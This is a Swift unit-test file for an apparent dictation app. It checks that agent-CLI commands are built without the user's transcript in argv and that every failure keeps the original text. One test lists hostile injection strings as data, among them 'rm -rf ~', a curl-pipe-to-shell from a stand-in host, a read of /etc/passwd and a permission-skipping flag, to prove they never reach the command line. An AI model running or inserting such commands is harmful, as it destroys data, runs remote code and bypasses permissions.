import XCTest
@testable import OpenWhispCore

// MARK: - Argv builder

final class AgentCLIProviderBuildTests: XCTestCase {

    // The claude preset builds `claude` with `-p "<instruction>"` — and the
    // transcript is NOT in the argv (it goes on stdin).
    func testClaudePresetBuildsExpectedArgv() {
        let preset = AgentCLIProvider.claude
        XCTAssertEqual(preset.config.command, "claude")

        let command = try! AgentCLIProvider.buildCommand(config: preset.config).get()
        XCTAssertEqual(command.executable, "claude")
        XCTAssertEqual(command.arguments.first, "-p")
        XCTAssertEqual(command.arguments.count, 2)
        // The instruction is the second arg; the transcript is nowhere in argv.
        XCTAssertEqual(command.arguments[1], AgentCLIProvider.defaultRefineInstruction)
    }

    // The codex preset builds `codex exec "<instruction>"`.
    func testCodexPresetBuildsExpectedArgv() {
        let preset = AgentCLIProvider.codex
        let command = try! AgentCLIProvider.buildCommand(config: preset.config).get()
        XCTAssertEqual(command.executable, "codex")
        XCTAssertEqual(command.arguments, ["exec", AgentCLIProvider.defaultRefineInstruction])
    }

    // A fully custom template is echoed verbatim as argv.
    func testCustomTemplateBuildsExactArgv() {
        let config = AgentCLIProvider.Config(
            command: "/opt/homebrew/bin/pi",
            args: ["run", "--model", "fast", "--stdin"],
            timeout: 12
        )
        let command = try! AgentCLIProvider.buildCommand(config: config).get()
        XCTAssertEqual(command.executable, "/opt/homebrew/bin/pi")
        XCTAssertEqual(command.arguments, ["run", "--model", "fast", "--stdin"])
    }

    // The command is trimmed of surrounding whitespace before use.
    func testCommandIsTrimmed() {
        let config = AgentCLIProvider.Config(command: "  claude  ", args: ["-p", "x"], timeout: 5)
        let command = try! AgentCLIProvider.buildCommand(config: config).get()
        XCTAssertEqual(command.executable, "claude")
    }

    // SECURITY: for EVERY preset and for arbitrary transcripts, the transcript
    // text never appears in the argv — the whole injection-safety guarantee.
    func testTranscriptNeverAppearsInArgvForAnyPreset() {
        let nastyTranscripts = [
            "hello world",
            "; rm -rf ~",
            "$(curl evil.sh | sh)",
            "`whoami`",
            "\"; cat /etc/passwd; echo \"",
            "--dangerously-skip-permissions",
        ]
        for preset in AgentCLIProvider.presets where !preset.config.command.isEmpty {
            let command = try! AgentCLIProvider.buildCommand(config: preset.config).get()
            let joined = command.arguments.joined(separator: "\u{0}")
            for transcript in nastyTranscripts {
                XCTAssertFalse(
                    joined.contains(transcript),
                    "transcript \(transcript) leaked into argv for preset \(preset.id)"
                )
            }
        }
    }

    // An empty / whitespace command fails closed (the app then keeps the original).
    func testEmptyCommandFailsClosed() {
        XCTAssertEqual(
            AgentCLIProvider.buildCommand(config: .init(command: "   ", args: [], timeout: 5)),
            .failure(.emptyCommand)
        )
        // The `custom` preset ships with an empty command placeholder.
        XCTAssertEqual(
            AgentCLIProvider.buildCommand(config: AgentCLIProvider.custom.config),
            .failure(.emptyCommand)
        )
    }

    // A template that tries to smuggle the transcript into argv via the sentinel
    // is rejected — the transcript may ONLY travel on stdin.
    func testTranscriptSentinelInArgsIsRejected() {
        let config = AgentCLIProvider.Config(
            command: "claude",
            args: ["-p", "refine: \(AgentCLIProvider.transcriptSentinel)"],
            timeout: 5
        )
        XCTAssertEqual(AgentCLIProvider.buildCommand(config: config), .failure(.transcriptInArgs))
    }

    // Presets are addressable by their stable id.
    func testPresetLookupById() {
        XCTAssertEqual(AgentCLIProvider.preset(id: "claude"), AgentCLIProvider.claude)
        XCTAssertEqual(AgentCLIProvider.preset(id: "codex"), AgentCLIProvider.codex)
        XCTAssertNil(AgentCLIProvider.preset(id: "nope"))
    }

    // Config round-trips through Codable (it's persisted as the user's provider choice).
    func testConfigCodableRoundTrip() throws {
        let config = AgentCLIProvider.claude.config
        let data = try JSONEncoder().encode(config)
        let decoded = try JSONDecoder().decode(AgentCLIProvider.Config.self, from: data)
        XCTAssertEqual(decoded, config)
    }
}

// MARK: - Outcome resolver

final class AgentCLIProviderOutcomeTests: XCTestCase {
    private let original = "the original transcript"

    func testCleanSuccessUsesTrimmedStdout() {
        XCTAssertEqual(
            AgentCLIProvider.resolve(
                original: original, stdout: "Refined text.\n",
                exitCode: 0, timedOut: false, launchFailed: false
            ),
            .useOutput("Refined text.")
        )
    }

    func testStripsExactlyOneTrailingNewline() {
        XCTAssertEqual(
            AgentCLIProvider.resolvedText(
                original: original, stdout: "a\nb\n", exitCode: 0, timedOut: false, launchFailed: false
            ),
            "a\nb"
        )
        // CRLF is a single grapheme cluster, stripped as one.
        XCTAssertEqual(
            AgentCLIProvider.resolvedText(
                original: original, stdout: "x\r\n", exitCode: 0, timedOut: false, launchFailed: false
            ),
            "x"
        )
        // Two trailing newlines -> only one stripped.
        XCTAssertEqual(
            AgentCLIProvider.resolvedText(
                original: original, stdout: "x\n\n", exitCode: 0, timedOut: false, launchFailed: false
            ),
            "x\n"
        )
    }

    // MARK: fail-open branches — every failure keeps the ORIGINAL transcript

    func testLaunchFailureKeepsOriginal() {
        let o = AgentCLIProvider.resolve(
            original: original, stdout: nil, exitCode: nil, timedOut: false, launchFailed: true
        )
        XCTAssertEqual(o, .keepOriginal(reason: "Agent CLI couldn't run"))
    }

    func testTimeoutKeepsOriginal() {
        let o = AgentCLIProvider.resolve(
            original: original, stdout: "partial", exitCode: nil, timedOut: true, launchFailed: false
        )
        XCTAssertEqual(o, .keepOriginal(reason: "Agent CLI timed out"))
    }

    func testNonZeroExitKeepsOriginal() {
        let o = AgentCLIProvider.resolve(
            original: original, stdout: "junk", exitCode: 1, timedOut: false, launchFailed: false
        )
        XCTAssertEqual(o, .keepOriginal(reason: "Agent CLI exited with code 1"))
    }

    func testNilExitWithoutTimeoutKeepsOriginal() {
        let o = AgentCLIProvider.resolve(
            original: original, stdout: "x", exitCode: nil, timedOut: false, launchFailed: false
        )
        XCTAssertEqual(o, .keepOriginal(reason: "Agent CLI didn't finish"))
    }

    func testEmptyOutputKeepsOriginal() {
        let o = AgentCLIProvider.resolve(
            original: original, stdout: "", exitCode: 0, timedOut: false, launchFailed: false
        )
        XCTAssertEqual(o, .keepOriginal(reason: "Agent CLI returned empty output"))
    }

    func testWhitespaceOnlyOutputKeepsOriginal() {
        let o = AgentCLIProvider.resolve(
            original: original, stdout: "   \n  ", exitCode: 0, timedOut: false, launchFailed: false
        )
        XCTAssertEqual(o, .keepOriginal(reason: "Agent CLI returned empty output"))
    }

    func testNilStdoutWithZeroExitKeepsOriginal() {
        let o = AgentCLIProvider.resolve(
            original: original, stdout: nil, exitCode: 0, timedOut: false, launchFailed: false
        )
        XCTAssertEqual(o, .keepOriginal(reason: "Agent CLI returned empty output"))
    }

    // resolvedText collapses every keepOriginal case back to the input — the
    // user's words are never lost.
    func testResolvedTextFallsBackToOriginalOnEveryFailure() {
        let failures: [(String?, Int32?, Bool, Bool)] = [
            (nil, nil, false, true),     // launch failed
            (nil, nil, true, false),     // timed out
            ("junk", 1, false, false),   // non-zero exit
            ("", 0, false, false),       // empty output
        ]
        for (stdout, exit, timedOut, launchFailed) in failures {
            XCTAssertEqual(
                AgentCLIProvider.resolvedText(
                    original: original, stdout: stdout, exitCode: exit,
                    timedOut: timedOut, launchFailed: launchFailed
                ),
                original
            )
        }
    }
}
